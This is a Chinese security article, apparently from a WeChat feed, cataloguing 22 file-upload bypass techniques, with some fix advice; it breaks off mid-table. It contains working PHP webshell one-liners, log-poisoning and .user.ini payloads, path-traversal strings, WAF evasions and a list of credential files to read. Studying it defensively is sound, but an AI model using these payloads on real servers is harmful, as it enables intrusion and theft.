---
title: 文件上传的 22 种绕过手法：一个\"理解不一致\"就够破门
url: https://mp.weixin.qq.com/s/uptqyVqkQxgnHSK0B04Jpg
source: Doonsec's feed
date: 2026-11-18
fetch_date: 2026-11-19T09:41:54.756153
---

# 文件上传的 22 种绕过手法：一个\"理解不一致\"就够破门

# 文件上传的 22 种绕过手法：一个"理解不一致"就够破门

原创

维度攻防
维度攻防

维度攻防

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

头像、附件、导入模板、证件照——只要有存文件的需求，前端就会挂一个上传按钮。它看起来只是"选个文件"的小功能，但在攻防视角里，它往往是整套系统里**唯一一条能把数据写进服务器磁盘的通道**。

写进去，就可能被执行；能被执行，就意味着你想要的那道墙已经绕过去了。

所以下面这 22 类手法值得逐条看一遍。不是为了教谁去打谁，而是因为——**防守方如果不知道差异出在哪，就永远只会在错误的位置加校验。**

## 一、22 种手法，其实是同一个根

先给结论：

> 绕过的本质只有一个：**检测发生在 A 处，执行发生在 B 处，而 A 和 B 对同一个文件的理解不一样。**

前端只认后缀，后端只认 `Content-Type`，WAF 只认第一个 `Content-Disposition`，容器却取最后一个；黑名单漏了大小写和双写，解析器又从右往左找后缀。

差异出现在哪，突破口就在哪。下面按"校验发生在哪一层"从上往下捋。

## 二、第一层：校验只活在浏览器里

### 手法 1 · 前端校验

```
<input type="file" accept=".png,.jpg">
```

或者 JS 里判断一下文件名后缀。这类校验服务端根本没参与——把 `shell.php` 改名成 `shell.png` 直接上传，包里带的文件名就是 `shell.png`，落盘后再改回 `.php` 即可。

### 手法 2 · 后端只看 Content-Type

服务端收到文件先看一眼 `Content-Type`，不是 `image/jpeg`、`image/png` 就拒绝。

可这个值来自请求头，而请求是攻击者自己发的。抓包改成 `image/jpeg`，文件内容一个字都不用动。

把这两条放在一起看很有意思：它们都"校验了"，但校验的是**客户端自己声明的信息**。等于让嫌疑人自己填笔录。

## 三、第二层：一场关于文件名的战争

### 手法 3 · %00 截断

有些程序会把上传目录和文件名拼在一起做路径检测，但检测和落盘用的不是同一个字符串处理函数。`%00`（空字节）在很多老版本语言里是字符串结束符：检测时看到 `/uploads/111.gif`，落盘时只留下前面那截。

```
/111.php%00.gif/111.gif   ->   /111.php
```

### 手法 4 · 黑名单的七种死法

黑名单是最常见的写法，禁掉 `php`、`jsp`、`asp` 就以为万事大吉。可"扩展名"这件事，不同语言、容器、文件系统各有各的理解：

* **大小写**

  ：`*.pHp`、`*.aSP`
* **双写**

  ：`*.pphphp`
* **Unicode**

  ：存在 `json_decode` 且检查发生在其之前时，`php` 可以写成 `\u0070hp`
* **换名单**

  ：`*.asa`、`*.cer`
* **特殊文件名**

  ：Windows 文件名不能以 `.` 或空格结尾，于是 `*.php.`、`*.php` 可用
* **0x00 截断**

  ：`*.php(0x00).jpg`、`*.php%00.jpg`

黑名单真正的问题不是"漏了某一个"，而是它必须去穷举一个无穷集合。而白名单只需要回答一个问题：**我允许什么。**

### 手法 5 · 双文件上传

上传点支持一次选多个文件，服务端却只校验了第一个，后面几个直接放行。

F12 找到那个上传表单，`action` 一般是检测页面的绝对路径（`xxx.php`、`xxx.asp`），补全成完整 URL，本地构造表单提交过去：第一个放合法的 `.jpg`，第二个放一句话或 WebShell。两个文件一起落地。

### 手法 6 · 目录穿越

上传时抓包，把 `filename` 改成 `./../../../flag`，上传成功后路径变成 `/uploads/./../../../flag`——文件落到了你不想让它去的地方。

这条手法的价值在于：它不是为了拿 shell，而是为了**把文件放到一个"有解析权"或者"能被读到"的目录**里去。

## 四、第三层：内容校验，和它与时间的赛跑

### 手法 7 · 竞争条件

有的站点是"先收文件、再检查、检查不过就删"。问题在于"收下"和"删掉"之间有一个时间窗——文件已经落在 web 目录里并且可以被访问。

先传一个只负责写文件的马：

```
<?php fputs(fopen("../shell.php","w"),'<?php @eval($_POST["cmd"]); ?>');?>
```

上传成功后立刻请求它，它会在同级目录生成 `shell.php`。等检查逻辑反应过来，删掉的只是第一个文件。窗口越窄，并发请求就得打得越密——这是一场纯粹的时间赛跑。

### 手法 8 · 文件幻数

只读前几个字节的程序，把合法文件头拼在木马前面就行：

```
.jpg   FF D8 FF E0 00 10 4A 46 49 46
.gif   47 49 46 38 39 61
.png   89 50 4E 47
```

再严一点的会用 `getimagesize()` 解析图像结构——光有文件头不够，还得构造出能被解析器认下的图像信息：

```
GIF89a
(…some binary data for image…)
<?php phpinfo(); ?>
(… skipping the rest of binary data …)
```

### 手法 9 · 二次渲染

图片上传后服务端往往要做压缩、裁剪、转格式。重新编码一遍，藏在图片里的后门基本就被抹掉了。

思路是反过来利用这套编码规律：把后门字节写进那些"不会被重编码改变"的位置，图片过一遍处理流程，木马还在原位。

### 手法 10 · 直接传 zip

传一个 zip，里面是 `shell.php`，拿到链接访问即可。

## 五、第四层：真正的杀招——让它"被当成 PHP 执行"

这一段是全文最值得细看的地方。当前面所有后缀校验都封死时，还有一条路：

**不传 php，但让非 php 后缀按 php 解析。**

### 手法 11 · .user.ini

`php.ini` 是全局配置；`.user.ini` 是按目录生效的用户级 INI 文件。PHP 会从被执行文件所在目录一路向上扫描到 web 根目录，它能设置的是 `PHP_INI_PERDIR`、`PHP_INI_USER` 模式的配置项。

它和 `php.ini` 最大的区别是**能被动态加载**：改完不用重启中间件，等 `user_ini.cache_ttl`（默认 300 秒）就会重新加载。前提是服务器跑在 CGI/FastCGI 模式下。

可惜稍敏感的配置项——`disable_functions`、`extension_dir`、`enable_dl`——都是 `PHP_INI_SYSTEM` 模式甚至 php.ini only，`.user.ini` 碰不到。不过有两个项已经足够：

```
auto_prepend_file=11.gif
```

`auto_prepend_file` 会在每个 PHP 文件执行前自动包含指定文件，效果类似 `require()`。于是目录下所有 php 文件都"自动"包含这个 `11.gif`——它可以是一张正常的图片，也可以是一句话木马。

使用条件只有两条：

```
上传 .user.ini 的目录必须有设置默认首页
php 版本必须在 5 以上
```

收益也很直接：

```
可以突破文件后缀的检测
可以突破"图片目录不给解析执行权限"的限制
```

### 手法 12 · 配合代码过滤绕过

配 `.user.ini` 时，图片里那段 PHP 还可能被内容扫描拦下来，那就继续改 payload：

```
过滤 php      →  <?=eval($_POST[x]);?>
过滤 []       →  <?=eval($_POST{x});?>
过滤 ; 与 []  →  <?=system('tac ../flag.*')?>
过滤 ()       →  <?=`tac ../fl*`?>
```

### 手法 13 · 日志包含

上传 `.user.ini` 后访问目录返回 403——目录里没有可执行入口。那就造一个入口。

先传一个内容随意的 `index.php`，让请求能打到这个目录；再传 `.user.ini` 把 `auto_prepend_file` 指向日志：

```
auto_prepend_file=/var/log/nginx/access.log
```

然后带着后门去打 UA 头，让 payload 落进 access.log：

```
User-Agent: <?=eval($_POST[x]);?>
```

访问目录首页时，`.user.ini` 自动包含 access.log，日志里的 payload 就被执行了。**你写的日志，成了别人的执行文件。**

### 手法 14 · .htaccess

`.htaccess` 是 Apache 的目录级配置文件，默认不支持 nginx。两步走：先传 `.htaccess` 把 `.png` 后缀映射成 php 解析，再传一张带后门的图片。

### 手法 15–18 · 解析漏洞（IIS / Apache / Nginx）

**IIS 5.x/6.x**

```
www.xxx.com/xxx.asp;.jpg    服务器默认不解析分号后面的内容，按 xxx.asp 解析
www.xxx.com/xx.asp/xx.jpg   .asp、.asa 目录下的文件全部按 asp 解析
```

**Apache**

`httpd.conf` 里如果配了 `AddType application/x-httpd-php .php .phtml`，那么 `.php3`、`.php4`、`.php5`、`.phtml`、`.pht` 都可能被当成 PHP 执行。而且 Apache 是**从右往左**找后缀的：最右侧不认识就往左走，直到遇到可解析的为止。

```
shell.php.qwe.asd   ->   shell.php
```

**Nginx**

根因是 `cgi.fix_pathinfo` 开着。访问 `/phpinfo.jpg/1.php` 时，`$fastcgi_script_name` 被设成 `phpinfo.jpg/1.php` 传给 PHP CGI，PHP 认为脚本是 `phpinfo.jpg`、`1.php` 只是 PATH\_INFO，于是把图片当 PHP 解析了。

```
/UploadFiles/image/1.jpg/1.php
/UploadFiles/image/1.jpg%00.php
/UploadFiles/image/1.jpg/%20\0.php
```

**IIS 7.5** 同理，根子也是 `cgi.fix_pathinfo`——不是 IIS 本身的问题。

这一整段最扎心的一点是：**漏洞不在你的代码里。** 你把后缀白名单写到极致，只要中间件还这么理解文件名，门就在那儿。

### 手法 19 · 借操作系统的命名规则

**Windows** 会截掉非法符号后面的内容：

```
test.asp.
test.asp(空格)
test.php:1.jpg
test.php::DATA shell.php::DATA shell.php::DATA...
```

**Linux** 下如果 php 后缀不被解析，可以试试 `pHp`。

## 六、第五层：文件之外的两个洞

### 手法 20 · 目录浏览

配置缺陷：某个目录没有默认首页，或者没正确设置默认首页，访问时会把整个目录结构列出来。数据库备份、配置文件、phpinfo、服务器探针、后台地址、数据库连接文件，全在这里排队等着被看见。

**探测**：扫描器扫一遍，或者按标题关键词 `index of` 搜——搜到的站点基本都开着。

**关闭**：

```
IIS      网站属性里勾掉「目录浏览」，重启
Apache   Options Indexes FollowSymLinks → Options -Indexes，重启
Nginx    默认不开；若已开启，删掉 autoindex on; 与 autoindex_exact_size on;，重启
```

### 手法 21 · 任意文件读取 / 下载

比目录浏览更狠：不光能看到结构，还能直接读到内容。配置文件、`/etc/passwd`、`/root/.bash_history` 都在射程内。

```
index.php?f=../../../../../../etc/passwd
```

WAF 过滤 `../` 时用 `.%252e/` 绕过：`%25` 是 `%`，`%2e` 是 `.`，拼起来还是 `../`。

**值得一读的敏感文件（精简版）**

```
Windows
C:\boot.ini                              系统版本
C:\Windows\System32\inetsrv\MetaBase.xml IIS 配置
C:\Windows\repair\sam                    系统初次安装的密码
C:\Windows\php.ini / my.ini              PHP / MySQL 配置
C:\Program Files\mysql\my.ini            MySQL 配置
C:\Program Files\mysql\data\mysql\user.MYD  MySQL root

Linux
/etc/passwd                 用户文件
/etc/shadow                 密码文件（能读说明是 root）
/etc/my.cnf                 MySQL 配置
/etc/httpd/conf/httpd.conf  Apache 配置
/etc/nginx/nginx.conf       Nginx 配置
/etc/redis.conf             Redis 配置
/etc/ssh/sshd_config        SSH 端口与策略
/root/.bash_history         历史命令
/root/.mysql_history        MySQL 历史命令
/root/.ssh/id_rsa           私钥
/root/.ssh/authorized_keys  免密登录
/var/lib/mlocate/mlocate.db 全盘文件索引
/proc/self/fd/*             文件描述符
```

**从文件读取到 Getshell**

想直接靠文件读取拿 shell 很难，但目标如果是 Tomcat，可以读 `tomcat-users.xml` 拿到管理台账号密码，登录后传 War 包。难点是不知道绝对路径——先读 `.bash_history`，从管理员的历史命令里翻出安装路径，再拼配置文件路径。

**修复方向**

* 文件名参数统一编码净化，类型走白名单，含恶意字符或空字符的直接拒
* 用 chroot 把 web 目录限制成进程能看到的根目录，越权也出不了这个"监狱"
* 及时升级中间件（如 WebSphere 的历史任意文件下载漏洞）
* 要下载的文件地址存进数据库，用户只提交文件 ID
* 下载前做权限判断，文件放在 web 无法直接访问的目录
* 不提供目录遍历服务，公开文件放下载目录用链接提供

## 七、第六层：WAF 为了性能留的那些缝

### 手法 22 · 十二种绕 WAF 的姿势

WAF 不是万能墙，它的每一条规则都是"在性能和覆盖之间做的一次取舍"，而取舍处就是缝。

1. **垃圾数据**

   ：WAF 只查前 1M，那前面 1M 全填垃圾，真正的马放后面。或者把垃圾加在 `Content-Disposition` 参数后面，参数过长导致检测出错。
2. **filename 换位置**

   ：IIS 6.0 下把 filename 挪到别处。
3. **改请求方法**

   ：规则是"POST 才校验内容"，那就抓包把 POST 改成 GET。
4. **组合已有手法**

   ：解析漏洞、文件包含，都能拿来绕。
5. **利用 WAF 自身缺陷**

   ：删掉 `Content` 整行；或删掉 `C` 后面的字符只留一个 `c`，再把 `.php` 接上（双引号要跟着 `c.php` 一起动）；删掉 `Content-Disposition` 里的空格。
6. **boundary 加料**

   ：在 boundary 后面加个空格，或者其他能被正常处理的字符。
7. **改大小写**

   ：修改 `Content-Disposition` 字段值的大小写。
8. **Boundary 不一致**

   ：两段 boundary 不一样，WAF 认为这段数据无意义，容器却照收不误（Win2k3 + IIS6.0 + ASP）。
9. **文件名处回车**

   。
10. **多个 Content-Disposition**

    ：IIS 取第一个值，WAF 只取最后一个，就被绕过了（Win2k8 + IIS7.0 + PHP）。
11. **NTFS ADS 特性**

    ：WAF 对请求正文里 filename 匹配不当时可利用。
12. **超长中文文件名 / 反删除**

    ：用非字母数字字符把文件名拉长；或者把校验逻辑要删除的目标名改掉，真正的马就留下来了（JCMS 漏洞）。

注意第 1 条和第 10 条的共同点：**WAF 和容器对同一个请求的理解不一样。** 和文章开头那句话，是同一件事。

## 八、22 种手法速查表

| # | 手法 | 所在层 | 一句话 |
| --- | --- | --- | --- |
| 1 | 前端校验 | 客户端 | 改后缀就过 |
| 2 | 只查 Content-Type | 请求头 | 抓包改头，内容不动 |
| 3 | %00 截断 | 文件名 | 检测看 `.gif`，落盘留 `.php` |...